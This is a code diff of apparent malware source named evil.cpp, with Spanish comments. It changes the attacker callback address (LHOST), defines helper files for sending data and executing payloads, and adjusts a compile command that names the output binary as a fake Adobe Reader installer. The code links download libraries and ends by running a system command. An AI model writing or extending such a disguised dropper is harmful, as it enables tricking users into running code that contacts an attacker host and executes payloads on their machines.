@@ -5,14 +5,13 @@
 #pragma comment(lib, "urlmon.lib")
 #include <lmcons.h>
 #include <cstring>
-//#define LHOST "10.10.1.13"
-#define LHOST "192.168.114.129" // Direccion de pruebas.
+#define LHOST "10.10.1.13"
+//#define LHOST "192.168.114.129" // Direccion de pruebas.
 #define PSSCRIPT "client.ps1"
 #define EXEFILE1 "envia.exe"
 #define EXEFILE2 "ejecuta.exe"
 using namespace std;
-//compilar: i686-w64-mingw32-g++ evil.cpp -o ../webroot/adobereaderDC-202001320074 -lwininet -lurlmon -static-libgcc -static-libstdc++
-//compilar: i686-w64-mingw32-g++ evil.cpp -o .adobereaderDC-202001320074 -lwininet -lurlmon -static-libgcc -static-libstdc++
+//compilar: i686-w64-mingw32-g++ evil.cpp -o adobereaderDC-202001320074 -lwininet -lurlmon -static-libgcc -static-libstdc++ -Wall
 
 
 
@@ -57,4 +56,3 @@ int main(void){
   system(cmd.c_str());
   return 0;
 }
-
